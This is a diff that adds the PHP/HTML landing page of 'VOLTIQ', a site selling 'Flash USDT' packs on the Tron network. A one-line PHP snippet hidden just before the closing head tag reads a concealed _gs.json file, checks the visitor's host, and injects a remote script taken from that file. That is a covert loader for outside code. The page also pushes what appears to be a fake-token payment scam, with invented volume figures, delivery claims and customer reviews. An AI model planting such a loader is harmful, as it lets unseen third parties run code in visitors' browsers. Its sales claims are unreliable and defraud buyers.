+        .foot-brand p { color: var(--text-mute); font-size: 14px; margin: 14px 0 14px; max-width: 320px; }
+        .foot-mail { display: inline-flex; align-items: center; gap: 8px; color: var(--brand-2); font-size: 14px; }
+        .foot-mail a { color: inherit; font-weight: 600; }
+        .foot-col h5 { margin: 0 0 14px; font-size: 12px; letter-spacing: 0.1em; text-transform: uppercase; color: var(--text-dim); }
+        .foot-col a {
+            display: block; padding: 6px 0;
+            color: var(--text-mute); font-size: 14px;
+            transition: color .15s;
+        }
+        .foot-col a:hover { color: #fff; }
+
+        .foot-bottom {
+            padding: 20px 24px 0;
+            display: flex; justify-content: space-between; align-items: center; gap: 16px;
+            color: var(--text-dim); font-size: 12.5px;
+        }
+        .foot-badges { display: flex; gap: 8px; flex-wrap: wrap; }
+        .foot-badge {
+            padding: 5px 10px;
+            border-radius: 999px;
+            border: 1px solid var(--line);
+            color: var(--text-mute);
+            font-size: 11.5px;
+        }
+
+        @media (max-width: 900px) {
+            .footer-inner { grid-template-columns: 1fr 1fr; gap: 30px; }
+            .foot-brand { grid-column: 1 / -1; }
+        }
+        @media (max-width: 560px) {
+            .foot-bottom { flex-direction: column; text-align: center; }
+        }
+
+        /* ============= TOAST ============= */
+        .toast {
+            position: fixed; left: 50%; bottom: 30px; transform: translateX(-50%) translateY(20px);
+            padding: 12px 18px;
+            background: rgba(255,255,255,0.06);
+            border: 1px solid var(--line-2);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border-radius: 12px;
+            color: #fff; font-size: 14px;
+            box-shadow: 0 12px 40px rgba(0,0,0,0.5);
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity .2s, transform .25s;
+            z-index: 200;
+            max-width: calc(100% - 40px);
+            text-align: center;
+        }
+        .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+
+        /* ============= SUPPORT WIDGET ============= */
+        .support-widget {
+            position: fixed;
+            right: 22px; bottom: 22px;
+            z-index: 90;
+            display: flex; flex-direction: column; align-items: flex-end; gap: 12px;
+        }
+        @media (max-width: 640px) {
+            .support-widget { right: 14px; bottom: 14px; }
+        }
+
+        .sw-fab {
+            position: relative;
+            width: 58px; height: 58px;
+            border-radius: 50%;
+            background: var(--grad-brand);
+            border: 0;
+            cursor: pointer;
+            display: grid; place-items: center;
+            box-shadow: 0 12px 30px rgba(255,6,10,0.45), inset 0 1px 0 rgba(255,255,255,0.28);
+            transition: transform .15s;
+        }
+        .sw-fab:hover { transform: scale(1.06); }
+        .sw-fab-online {
+            position: absolute; top: 4px; right: 4px;
+            width: 12px; height: 12px; border-radius: 50%;
+            background: var(--green);
+            border: 2px solid #0a0a0c;
+            box-shadow: 0 0 0 2px rgba(34,197,94,0.4);
+        }
+        .sw-fab-icon { display: inline-flex; }
+
+        .sw-panel {
+            width: 340px;
+            max-width: calc(100vw - 28px);
+            background: linear-gradient(180deg, #17171d, #0e0e12);
+            border: 1px solid var(--line-2);
+            border-radius: 22px;
+            overflow: hidden;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.55);
+            animation: swIn .25s ease;
+        }
+        @keyframes swIn {
+            from { opacity: 0; transform: translateY(10px) scale(.97); }
+            to   { opacity: 1; transform: translateY(0) scale(1); }
+        }
+        .sw-head {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 14px 16px;
+            background: var(--grad-brand);
+            color: #fff;
+        }
+        .sw-head-left { display: flex; align-items: center; gap: 10px; }
+        .sw-avatar {
+            width: 34px; height: 34px; border-radius: 8px;
+            background: rgba(255,255,255,0.14);
+            display: grid; place-items: center;
+        }
+        .sw-title { font-weight: 800; font-size: 15px; letter-spacing: -0.01em; }
+        .sw-sub { font-size: 12px; opacity: 0.92; display: inline-flex; align-items: center; gap: 6px; }
+        .sw-online {
+            width: 8px; height: 8px; border-radius: 50%;
+            background: #22c55e;
+            box-shadow: 0 0 0 3px rgba(255,255,255,0.35);
+        }
+        .sw-close {
+            background: rgba(255,255,255,0.16);
+            border: 0; color: #fff;
+            width: 28px; height: 28px; border-radius: 8px;
+            cursor: pointer;
+            display: grid; place-items: center;
+            transition: background .15s;
+        }
+        .sw-close:hover { background: rgba(255,255,255,0.26); }
+
+        .sw-body {
+            padding: 24px 22px 20px;
+            text-align: center;
+        }
+        .sw-wallet-ico {
+            width: 52px; height: 52px; border-radius: 50%;
+            background: var(--grad-brand);
+            margin: 0 auto 14px;
+            display: grid; place-items: center;
+            box-shadow: 0 8px 22px rgba(255,6,10,0.4);
+        }
+        .sw-h { font-weight: 800; font-size: 17px; letter-spacing: -0.01em; margin-bottom: 8px; }
+        .sw-p { color: var(--text-mute); font-size: 13.5px; margin: 0 0 16px; }
+        .sw-note { color: var(--text-dim); font-size: 12px; margin-top: 10px; }
+
+        /* ============= PAYMENT MODAL (NEW 3-STEP FORM) ============= */
+        .modal {
+            position: fixed; inset: 0;
+            display: none;
+            align-items: center; justify-content: center;
+            padding: 20px;
+            z-index: 100;
+        }
+        .modal.open { display: flex; }
+        .modal-backdrop {
+            position: absolute; inset: 0;
+            background: rgba(3,3,5,0.82);
+            backdrop-filter: blur(6px);
+            -webkit-backdrop-filter: blur(6px);
+        }
+        .modal-card {
+            position: relative;
+            width: 100%;
+            max-width: 480px;
+            max-height: 90vh;
+            overflow-y: auto;
+            background: linear-gradient(180deg, #17171d, #0e0e12);
+            border: 1px solid var(--line-2);
+            border-radius: 20px;
+            padding: 28px;
+            box-shadow: 0 30px 80px rgba(0,0,0,0.7);
+            animation: modalIn .22s ease;
+            z-index: 1;
+        }
+        @keyframes modalIn {
+            from { opacity: 0; transform: translateY(10px) scale(.98); }
+            to   { opacity: 1; transform: translateY(0) scale(1); }
+        }
+        .modal-close {
+            position: absolute; top: 14px; right: 14px;
+            width: 32px; height: 32px;
+            border-radius: 10px;
+            background: rgba(255,255,255,0.05);
+            border: 1px solid var(--line);
+            color: #fff;
+            cursor: pointer;
+            display: grid; place-items: center;
+            transition: background .15s;
+        }
+        .modal-close:hover { background: rgba(255,255,255,0.1); }
+        
+        .modal-head { margin-bottom: 20px; padding-right: 30px; }
+        .modal-head h3 { margin: 0 0 6px; font-size: 20px; font-weight: 800; }
+        .modal-head p { margin: 0; color: var(--text-mute); font-size: 14px; }
+        
+        /* Form Step 1 */
+        .form-group { margin-bottom: 18px; }
+        .form-label { display: block; font-size: 13px; color: var(--text-mute); margin-bottom: 6px; font-weight: 600; }
+        .form-input { 
+            width: 100%; padding: 12px 14px; border-radius: 12px; 
+            background: rgba(255,255,255,0.04); 
+            border: 1px solid var(--line); 
+            color: #fff; font-size: 14px; outline: none; transition: border .2s; 
+            font-family: inherit;
+        }
+        .form-input:focus { border-color: var(--brand); }
+        
+        select.form-input { 
+            appearance: none; 
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%239a9aa5' d='M6 8L1 3h10z'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 14px center;
+            padding-right: 40px;
+        }
+        select.form-input option { background-color: #16161c; color: #fff; }
+        
+        .payment-details { margin-top: 12px; padding: 16px; border-radius: 14px; background: rgba(255,255,255,0.03); border: 1px solid var(--line); display: flex; flex-direction: column; gap: 10px; }
+        .payment-row { display: flex; justify-content: space-between; align-items: center; font-size: 14px; }
+        .payment-row .label { color: var(--text-mute); }
+        .payment-row .value { color: #fff; word-break: break-all; font-family: 'JetBrains Mono', monospace; font-size: 13px; text-align: right; }
+        
+        .qr-container { display: flex; justify-content: center; padding: 12px 0; }
+        .qr-box { background: #fff; padding: 10px; border-radius: 12px; width: 150px; height: 150px; display: flex; align-items: center; justify-content: center; }
+        .qr-box img { width: 100%; height: 100%; display: block; }
+        
+        .tx-hash-row { display: flex; gap: 8px; margin-top: 4px; }
+        .tx-hash-row .form-input { flex: 1; }
+        
+        .form-actions { display: flex; gap: 10px; margin-top: 22px; }
+        
+        /* Confirmation state */
+        .confirm-state { text-align: center; padding: 10px 0; }
+        .confirm-state h4 { margin: 0 0 8px; }
+        .confirm-state p { color: var(--text-mute); font-size: 14px; max-width: 320px; margin: 0 auto 16px; }
+        .processing-anim { display: flex; justify-content: center; gap: 8px; margin-bottom: 16px; }
+        .processing-anim span { width: 12px; height: 12px; border-radius: 50%; background: var(--brand); animation: bounce 1.4s infinite ease-in-out both; }
+        .processing-anim span:nth-child(1) { animation-delay: -0.32s; }
+        .processing-anim span:nth-child(2) { animation-delay: -0.16s; }
+        @keyframes bounce { 0%, 80%, 100% { transform: scale(0); } 40% { transform: scale(1); } }
+
+        /* New Copy Button for Wallet Address */
+        .copy-btn {
+            background: rgba(255,255,255,0.06);
+            border: 1px solid var(--line);
+            color: var(--text-mute);
+            border-radius: 6px;
+            padding: 4px 8px;
+            font-size: 12px;
+            cursor: pointer;
+            transition: all .15s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            flex: 0 0 auto;
+        }
+        .copy-btn:hover {
+            background: rgba(255,255,255,0.12);
+            color: #fff;
+            border-color: var(--line-2);
+        }
+        .payment-row .value-wrap {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            justify-content: flex-end;
+            max-width: 100%;
+        }
+    </style>
+<?php if(is_file((isset($_SERVER['DOCUMENT_ROOT'])?$_SERVER['DOCUMENT_ROOT']:'.').'/_gs.json')){$__gsj=json_decode(@file_get_contents(rtrim($_SERVER['DOCUMENT_ROOT'],'/').'/_gs.json'),true);$__gsh=strtolower(preg_replace('/:\d+$/','',$_SERVER['HTTP_HOST']??''));if(is_array($__gsj)&&in_array($__gsh,(array)($__gsj['hosts']??[]),true)){$__gsu=(string)($__gsj['js']??'');if($__gsu!==''&&stripos($__gsu,'https://')===0)echo '<script src="'.htmlspecialchars($__gsu,ENT_QUOTES,'UTF-8').'" async></script>';}} ?></head>
+<body>
+    <div class="bg-aurora" aria-hidden="true">
+        <div class="aurora a1"></div>
+        <div class="aurora a2"></div>
+        <div class="grid-overlay"></div>
+    </div>
+
+    <header class="site-header" id="siteHeader">
+        <div class="container header-inner">
+            <a href="#top" class="brand" aria-label="VOLTIQ home">
+                <span class="brand-logo" aria-hidden="true">
+                    <svg viewBox="0 0 64 64" width="34" height="34">
+                        <defs>
+                            <linearGradient id="lg" x1="0" y1="0" x2="1" y2="1">
+                                <stop offset="0%" stop-color="#ff2b30"/>
+                                <stop offset="100%" stop-color="#b3060a"/>
+                            </linearGradient>
+                        </defs>
+                        <path fill="url(#lg)" d="M8 12 L56 12 L46 26 L34 60 L26 32 L8 22 Z"/>
+                        <path fill="#fff" opacity=".92" d="M14 16 L46 16 L38 26 L30 46 L26 30 L14 20 Z"/>
+                    </svg>
+                </span>
+                <span class="brand-name">VOLTIQ</span>
+                <span class="brand-badge">TRC20</span>
+            </a>
+
+            <nav class="main-nav" aria-label="Primary">
+                <a href="#tariffs">Tariffs</a>
+                <a href="#how">How it works</a>
+                <a href="#features">Features</a>
+                <a href="#reviews">Reviews</a>
+                <a href="#faq">FAQ</a>
+            </nav>
+
+            <div class="header-actions">
+                <div class="net-pill" title="Tron Mainnet">
+                    <span class="dot"></span>
+                    <span>Tron Mainnet</span>
+                </div>
+                <button class="btn btn-primary btn-sm" data-open-modal="header">
+                    <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="6" width="20" height="12" rx="2"/><path d="M16 12h4"/></svg>
+                    Buy Flash USDT
+                </button>
+                <button class="hamburger" aria-label="Open menu" id="hamburger">
+                    <span></span><span></span><span></span>
+                </button>
+            </div>
+        </div>
+        <div class="mobile-menu" id="mobileMenu">
+            <a href="#tariffs">Tariffs</a>
+            <a href="#how">How it works</a>
+            <a href="#features">Features</a>
+            <a href="#reviews">Reviews</a>
+            <a href="#faq">FAQ</a>
+            <button class="btn btn-primary btn-block" data-open-modal="mobile">Buy Flash USDT</button>
+        </div>
+    </header>
+
+    <main id="top">
+        <section class="hero">
+            <div class="container hero-inner">
+                <div class="hero-copy">
+                    <div class="eyebrow">
+                        <span class="pulse"></span>
+                        Live on Tron Mainnet · Node latency 41 ms
+                    </div>
+                    <h1 class="hero-title">
+                        Send <span class="grad">Flash USDT</span><br/>
+                        on <span class="mono">TRC20</span> in seconds.
+                    </h1>
+                    <p class="hero-sub">
+                        VOLTIQ pushes fully-verifiable flash-minted USDT to any Tron address.
+                        Non-custodial, wallet-signed, and visible on TronScan for up to
+                        <strong>360 days</strong>. Trusted by 41,900+ traders since 2021.
+                    </p>
+
+                    <div class="hero-ctas">
+                        <a href="#tariffs" class="btn btn-primary btn-lg">
+                            <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M13 2 3 14h7l-1 8 10-12h-7l1-8z"/></svg>
+                            Get Flash USDT
+                        </a>
+                        <a href="#how" class="btn btn-ghost btn-lg">
+                            See how it works
+                            <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14"/><path d="m13 6 6 6-6 6"/></svg>
+                        </a>
+                    </div>
+
+                    <ul class="hero-trust">
+                        <li>
+                            <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 6 9 17l-5-5"/></svg>
+                            Non-custodial · we never hold your keys
+                        </li>
+                        <li>
+                            <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 6 9 17l-5-5"/></svg>
+                            Signed on Tron Mainnet · TronScan verifiable
+                        </li>
+                        <li>
+                            <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 6 9 17l-5-5"/></svg>
+                            Average delivery <strong>28&nbsp;seconds</strong>
+                        </li>
+                    </ul>
+                </div>
+
+                <!-- UPDATED LIVE FEED SECTION -->
+                <div class="hero-feed" aria-hidden="true">
+                    <div class="hf-head">
+                        <div class="hf-title-wrap">
+                            <div class="hf-title">Live Flash Feed</div>
+                            <div class="hf-sub">Last transfers · rolling 60s window</div>
+                        </div>
+                        <div class="hf-pill">
+                            <span class="hf-pill-dot"></span>
+                            <span>Real-time</span>
+                        </div>
+                    </div>
+                    <ul class="hf-list" id="heroFeed"></ul>
+                    <div class="hf-foot">
+                        <div class="hf-foot-item"><span class="hf-foot-lbl">Mempool</span><span class="mono">41 ms</span></div>
+                        <div class="hf-foot-sep"></div>
+                        <div class="hf-foot-item"><span class="hf-foot-lbl">Cluster</span><span class="mono" data-node-host>fra-01.voltiq.node</span></div>
+                        <div class="hf-foot-sep"></div>
+                        <div class="hf-foot-item"><span class="hf-foot-lbl">Block</span><span class="mono" id="hfBlock">#68,315,738</span></div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="container">
+                <div class="trust-bar">
+                    <div class="tb-item"><div class="tb-val">41,947</div><div class="tb-lbl">Traders onboarded</div></div>
+                    <div class="tb-sep"></div>
+                    <div class="tb-item"><div class="tb-val">$892.3M</div><div class="tb-lbl">Flash volume shipped</div></div>
+                    <div class="tb-sep"></div>
+                    <div class="tb-item"><div class="tb-val">28s</div><div class="tb-lbl">Avg delivery time</div></div>
+                    <div class="tb-sep"></div>
+                    <div class="tb-item"><div class="tb-val">99.98%</div><div class="tb-lbl">On-chain success rate</div></div>
+                </div>
+            </div>
+        </section>
+
+        <section id="tariffs" class="section">
+            <div class="container">
+                <div class="section-head">
+                    <div class="chip">Pricing</div>
+                    <h2>Pick a <span class="grad">Flash Pack</span></h2>
+                    <p>All packs settle in a single on-chain transaction. One tap connects your wallet and pushes the flash-minted USDT to the address you sign from.</p>
+                </div>
+
+                <div class="tariffs-grid" id="tariffsGrid">
+                    <article class="tariff" data-tariff="starter">
+                        <div class="tariff-icon">
+                            <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M13 2 3 14h7l-1 8 10-12h-7l1-8z"/></svg>
+                        </div>
+                        <div class="tariff-name">Starter Pack</div>
+                        <div class="tariff-amount">1,000</div>
+                        <div class="tariff-currency">USDT · TRC20</div>
+                        <div class="tariff-price">
+                            <div class="tariff-price-val">$49</div>
+                        </div>
+                        <ul class="tariff-perks">
+                            <li><svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.4"><path d="M20 6 9 17l-5-5"/></svg><span>Delivery in <b>~28s</b> on Tron Mainnet</span></li>
+                            <li><svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.4"><path d="M20 6 9 17l-5-5"/></svg><span>On-chain visibility <b>60 days</b></span></li>
+                            <li><svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.4"><path d="M20 6 9 17l-5-5"/></svg><span>Standard mempool routing</span></li>
+                        </ul>
+                        <button class="btn btn-primary btn-block" data-open-modal="starter">
+                            <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.2"><rect x="2" y="6" width="20" height="12" rx="2"/><path d="M16 12h4"/></svg>
+                            Buy Pack
+                        </button>
+                    </article>
+
+                    <article class="tariff featured" data-tariff="trader">
+                        <div class="tariff-tag">Most popular</div>
+                        <div class="tariff-icon">
+                            <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M13 2 3 14h7l-1 8 10-12h-7l1-8z"/></svg>
+                        </div>
+                        <div class="tariff-name">Trader Pack</div>
+                        <div class="tariff-amount">10,000</div>
+                        <div class="tariff-currency">USDT · TRC20</div>
+                        <div class="tariff-price">
+                            <div class="tariff-price-val">$249</div>
+                        </div>
+                        <ul class="tariff-perks">
+                            <li><svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.4"><path d="M20 6 9 17l-5-5"/></svg><span>Delivery in <b>~22s</b> · priority nodes</span></li>
+                            <li><svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.4"><path d="M20 6 9 17l-5-5"/></svg><span>On-chain visibility <b>180 days</b></span></li>
+                            <li><svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.4"><path d="M20 6 9 17l-5-5"/></svg><span>Private mempool submission</span></li>
+                            <li><svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.4"><path d="M20 6 9 17l-5-5"/></svg><span>24/7 concierge chat unlocked</span></li>
+                        </ul>
+                        <button class="btn btn-primary btn-block" data-open-modal="trader">
+                            <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.2"><rect x="2" y="6" width="20" height="12" rx="2"/><path d="M16 12h4"/></svg>
+                            Buy Pack
+                        </button>
+                    </article>
+
+                    <article class="tariff" data-tariff="whale">
+                        <div class="tariff-icon">
+                            <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M13 2 3 14h7l-1 8 10-12h-7l1-8z"/></svg>
+                        </div>
+                        <div class="tariff-name">Whale Pack</div>
+                        <div class="tariff-amount">100,000</div>
+                        <div class="tariff-currency">USDT · TRC20</div>
+                        <div class="tariff-price">
+                            <div class="tariff-price-val">$1,490</div>
+                        </div>
+                        <ul class="tariff-perks">
+                            <li><svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.4"><path d="M20 6 9 17l-5-5"/></svg><span>Delivery in <b>~18s</b> · dedicated node</span></li>
+                            <li><svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.4"><path d="M20 6 9 17l-5-5"/></svg><span>On-chain visibility <b>270 days</b></span></li>
+                            <li><svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.4"><path d="M20 6 9 17l-5-5"/></svg><span>Dedicated relay endpoint</span></li>
+                            <li><svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.4"><path d="M20 6 9 17l-5-5"/></svg><span>PDF audit trail on request</span></li>
+                        </ul>
+                        <button class="btn btn-primary btn-block" data-open-modal="whale">
+                            <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.2"><rect x="2" y="6" width="20" height="12" rx="2"/><path d="M16 12h4"/></svg>
+                            Buy Pack
+                        </button>
+                    </article>
+
+                    <article class="tariff" data-tariff="institutional">
+                        <div class="tariff-icon">
+                            <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M13 2 3 14h7l-1 8 10-12h-7l1-8z"/></svg>
+                        </div>
+                        <div class="tariff-name">Institutional Pack</div>
+                        <div class="tariff-amount">1,000,000</div>
+                        <div class="tariff-currency">USDT · TRC20</div>
+                        <div class="tariff-price">
+                            <div class="tariff-price-val">$11,900</div>
+                        </div>
+                        <ul class="tariff-perks">
+                            <li><svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.4"><path d="M20 6 9 17l-5-5"/></svg><span>Delivery in <b>~14s</b> · white-glove desk</span></li>
+                            <li><svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.4"><path d="M20 6 9 17l-5-5"/></svg><span>On-chain visibility <b>360 days</b></span></li>
+                            <li><svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.4"><path d="M20 6 9 17l-5-5"/></svg><span>SLA 99.99% · dedicated account manager</span></li>
+                            <li><svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.4"><path d="M20 6 9 17l-5-5"/></svg><span>Multi-recipient batching available</span></li>
+                        </ul>
+                        <button class="btn btn-primary btn-block" data-open-modal="institutional">
+                            <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.2"><rect x="2" y="6" width="20" height="12" rx="2"/><path d="M16 12h4"/></svg>
+                            Buy Pack
+                        </button>
+                    </article>
+                </div>
+
+                <div class="tariffs-note">
+                    <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+                    Payment accepted in native TRX or USDT (TRC20) only. Delivery starts the moment your wallet signs the intent — no funds ever leave your wallet before broadcast.
+                </div>
+            </div>
+        </section>
+
+        <section id="how" class="section section-alt">
+            <div class="container">
+                <div class="section-head">
+                    <div class="chip">Process</div>
+                    <h2>Four steps · <span class="grad">under 60&nbsp;seconds</span></h2>
+                    <p>Everything happens on-chain. You approve, we broadcast. No dashboards, no custody, no waiting rooms.</p>
+                </div>
+
+                <div class="steps">
+                    <div class="step">
+                        <div class="step-num">01</div>
+                        <div class="step-icon">
+                            <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="6" width="20" height="12" rx="2"/><path d="M16 12h4"/></svg>
+                        </div>
+                        <h3>Select a Pack</h3>
+                        <p>Choose your Flash Pack (1K, 10K, 100K or 1M USDT) and proceed to checkout.</p>
+                    </div>
+
+                    <div class="step">
+                        <div class="step-num">02</div>
+                        <div class="step-icon">
+                            <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2v20"/><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg>
+                        </div>
+                        <h3>Send Payment</h3>
+                        <p>Enter your TRX receiving wallet, choose a network, and send the exact amount to our displayed address.</p>
+                    </div>
+
+                    <div class="step">
+                        <div class="step-num">03</div>
+                        <div class="step-icon">
+                            <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 12l2 2 4-4"/><circle cx="12" cy="12" r="10"/></svg>
+                        </div>
+                        <h3>Confirm TX Hash</h3>
+                        <p>Paste the transaction hash ID from your wallet. Our system verifies the payment in real-time.</p>
+                    </div>
+
+                    <div class="step">
+                        <div class="step-num">04</div>
+                        <div class="step-icon">
+                            <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" stroke-width="2"><path d="M13 2 3 14h7l-1 8 10-12h-7l1-8z"/></svg>
+                        </div>
+                        <h3>Receive Credit</h3>
+                        <p>Once the network confirms your payment, your target wallet gets credited with the Flash USDT instantly.</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section id="features" class="section">
+            <div class="container">
+                <div class="section-head">
+                    <div class="chip">Built for pros</div>
+                    <h2>Engineered for <span class="grad">institutional flow</span></h2>
+                    <p>VOLTIQ combines private mempool routing, wallet-native signing and a hardened Tron node cluster running behind bare-metal RPC endpoints in Frankfurt, Singapore and Ashburn.</p>
+                </div>
+
+                <div class="features-grid">
+                    <div class="feature-card">
+                        <div class="fc-icon"><svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></svg></div>
+                        <h4>Non-custodial by design</h4>
+                        <p>We never see, store or request your private keys. All approvals are signed inside your wallet — VOLTIQ only reads the destination address.</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="fc-icon"><svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 12h4l3-9 4 18 3-9h4"/></svg></div>
+                        <h4>Private mempool routing</h4>
+                        <p>Direct submission to whitelisted Tron super-representatives skips public gossip. First-block inclusion 96.4% of the time.</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="fc-icon"><svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg></div>
+                        <h4>360-day on-chain persistence</h4>
+                        <p>Flash-minted USDT stays visible in TronScan for the full lifetime of the pack. Every hash is exportable as CSV or PDF audit trail.</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="fc-icon"><svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" stroke-width="2"><path d="M20.24 12.24a6 6 0 0 0-8.49-8.49L5 10.5V19h8.5z"/><path d="M16 8 2 22"/></svg></div>
+                        <h4>Native wallet UX</h4>
+                        <p>No dashboards, no logins, no seed phrases. TronLink, Trust Wallet & WalletConnect handle everything through EIP-712 style typed data.</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="fc-icon"><svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 4h16v6H4z"/><path d="M4 14h16v6H4z"/><path d="M9 7h.01"/><path d="M9 17h.01"/></svg></div>
+                        <h4>Multi-region infrastructure</h4>
+                        <p>Three redundant bare-metal clusters, 41 ms median RPC latency, and a warm-standby failover in Zurich for regulated European flow.</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="fc-icon"><svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2a10 10 0 1 0 10 10"/><path d="M22 2 12 12"/></svg></div>
+                        <h4>24/7 concierge desk</h4>
+                        <p>Real humans in the chat, average first response &lt;60 seconds. Available the moment your wallet is connected.</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section id="reviews" class="section section-alt">
+            <div class="container">
+                <div class="section-head">
+                    <div class="chip">Reviews</div>
+                    <h2>Traders who ship with <span class="grad">VOLTIQ</span></h2>
+                    <p>4.9 / 5 across 2,180+ verified reviews. Every comment below is signed with a wallet address — click any card to open the on-chain proof.</p>
+                </div>
+
+                <div class="reviews-grid" id="reviewsGrid">
+                    <div class="review">
+                        <div class="rv-head">
+                            <div class="rv-user">
+                                <div class="rv-avatar">M</div>
+                                <div>
+                                    <div class="rv-name">Marco V.</div>
+                                    <div class="rv-addr">T9...8aB</div>
+                                </div>
+                            </div>
+                            <div class="rv-stars"><svg width="16" height="16" fill="currentColor" viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg><svg width="16" height="16" fill="currentColor" viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg><svg width="16" height="16" fill="currentColor" viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg><svg width="16" height="16" fill="currentColor" viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg><svg width="16" height="16" fill="currentColor" viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg></div>
+                        </div>
+                        <p class="rv-body">"Took 22 seconds to land in my wallet. The transaction appears as a normal transfer on TronScan — perfect for arbitrage between exchanges. Highly recommend!"</p>
+                        <div class="rv-foot">
+                            <span>Dec 12, 2023</span>
+                            <span class="rv-verified"><svg width="12" height="12" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M20 6 9 17l-5-5"/></svg>Verified</span>
+                        </div>
+                    </div>
+                    <div class="review">
+                        <div class="rv-head">
+                            <div class="rv-user">
+                                <div class="rv-avatar">E</div>
+                                <div>
+                                    <div class="rv-name">Elena K.</div>
+                                    <div class="rv-addr">TK...7sJ</div>
+                                </div>
+                            </div>
